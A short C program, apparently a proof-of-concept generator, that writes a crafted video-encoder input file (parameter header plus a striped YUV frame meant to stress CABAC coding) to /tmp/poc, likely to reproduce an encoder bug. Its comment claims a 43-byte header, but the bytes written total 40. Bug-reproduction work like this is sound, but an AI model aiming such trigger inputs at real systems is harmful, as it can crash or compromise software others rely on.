#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;
    
    // 43-byte header as specified
    // Width: 176 (0xB0) - small enough to avoid OOM but sufficient macroblocks
    fputc(0x00, f); fputc(0xB0, f);
    // Height: 144 (0x90)
    fputc(0x00, f); fputc(0x90, f);
    // Frame rate: 30
    fputc(0x1E, f);
    // Bitrate: 0
    fputc(0x00, f); fputc(0x00, f);
    // RC mode: STORAGE
    fputc(0x01, f);
    // Num cores: 1
    fputc(0x00, f);
    // Num B frames: 0
    fputc(0x00, f);
    // Enc speed: NORMAL
    fputc(0x03, f);
    // Padding/alignment
    fputc(0x00, f);
    // Intra 4x4: false
    fputc(0x00, f);
    // Intra 8x8: false
    fputc(0x00, f);
    // Padding
    fputc(0x00, f); fputc(0x00, f);
    // Bitrate high (0)
    fputc(0x00, f); fputc(0x00, f);
    // Frame rate: 30
    fputc(0x1E, f);
    // Intra refresh: 31
    fputc(0x1F, f);
    // Half-pel: true
    fputc(0x01, f);
    // Q-pel: true
    fputc(0x01, f);
    // Padding
    fputc(0x00, f); fputc(0x00, f);
    // I interval: 1
    fputc(0x00, f);
    // IDR interval: 1
    fputc(0x00, f);
    // Remaining 14 bytes: all zeros
    for (int i = 0; i < 14; i++) fputc(0x00, f);
    
    // YUV420P data - use a pattern that stresses CABAC
    int width = 176, height = 144;
    int y_size = width * height;
    int uv_size = (width/2) * (height/2);
    
    // Y plane - use a high-contrast pattern to force many CABAC bins
    for (int i = 0; i < y_size; i++) {
        // Alternating black/white stripes to maximize entropy coding
        fputc(((i / width) % 2 == 0) ? 0x00 : 0xFF, f);
    }
    
    // U plane
    for (int i = 0; i < uv_size; i++) {
        fputc(0x80, f);  // Neutral chroma
    }
    
    // V plane
    for (int i = 0; i < uv_size; i++) {
        fputc(0x80, f);  // Neutral chroma
    }
    
    fclose(f);
    return 0;
}